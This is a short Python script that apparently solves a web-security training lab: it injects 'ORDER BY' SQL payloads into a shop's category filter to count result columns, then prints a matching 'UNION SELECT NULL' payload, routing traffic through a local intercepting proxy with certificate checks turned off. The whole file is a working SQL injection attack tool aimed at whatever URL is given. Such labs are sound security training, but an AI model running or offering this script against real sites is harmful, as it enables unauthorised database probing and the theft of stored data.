import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = 'filter?category=Pets'
    for i in range(1, 10):
        sql_payload = f"'+ORDER+BY+{i}--"
        response = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        if "Internal Server Error" in response.text:
            return i - 1
        i += 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(-1)

    print(f"[+] Cooking up a SQLi attack on {url}")
    if url[-1] != '/':
        url += '/'
    num_columns = exploit_sqli(url)
    if num_columns:
        print(f"[+] The number of columns is {num_columns}")
        null = "NULL+" * num_columns
        print(f"[+] The payload is: '+UNION+SELECT+" + null[:-1] + "--")
    else:
        print("[-] The SQLi attack was unsuccessful")
        sys.exit(-1)
